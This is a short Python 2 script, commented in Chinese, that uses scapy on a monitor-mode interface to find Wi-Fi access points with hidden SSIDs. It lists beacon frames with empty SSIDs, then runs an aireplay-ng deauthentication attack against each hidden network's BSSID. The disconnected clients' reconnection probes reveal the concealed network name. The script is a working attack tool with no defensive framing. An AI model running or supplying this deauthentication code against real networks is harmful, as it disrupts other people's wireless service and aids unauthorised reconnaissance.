#!/usr/bin/python
#-*-coding:utf-8 -*-

import urllib, base64, binascii, time, re
from scapy.all import *

mac = []
hiddenmac = []
findmac = []
flag = 1
def PacketHandler(pkt):	
	global flag

	if pkt.haslayer(Dot11):#判断数据包是否属于802.11
		if (pkt.addr2 in hiddenmac and flag == 1): #判断是不是隐藏wifi的mac地址
			print '获取SSID中......'
			f = os.popen('aireplay-ng --deauth 10 -a '+pkt.addr2+' mon0 --ignore-negative-one') #发送攻击命令
			#os.system('aireplay-ng --deauth 10 -a '+pkt.addr2+' mon0 --ignore-negative-one')
			flag = 0;
		if pkt.type == 0 and pkt.subtype == 5:#取出所有的probe response帧
			if pkt.addr2 in hiddenmac:#判断是否为隐藏wifi
				if pkt.addr2 not in findmac:
					findmac.append(pkt.addr2)
					a = '隐藏wifi的MAC地址：%s\t SSID：%s'%(pkt.addr2, pkt.info)
					print a

	if pkt.haslayer(Dot11):#判断数据包是否属于802.11
		if pkt.type == 0 and pkt.subtype == 8:#取出所有的beacon帧
			if pkt.addr2 not in mac:#确保BSSID不重复
				mac.append(pkt.addr2) 
				a = 'MAC地址：%s\tSSID：%s'%(pkt.addr2, pkt.info)
				#print a
				if pkt.info == '' :#如果SSID为空
					if pkt.addr2 not in hiddenmac:
						hiddenmac.append(pkt.addr2)		
						print '隐藏wifi的MAC地址： %s' %pkt.addr2
	
	        
					
	
				
					
				


sniff(iface = 'mon0', prn = PacketHandler) #监听mon0捕获数据包，并把每个数据包都应用于PacketHandler
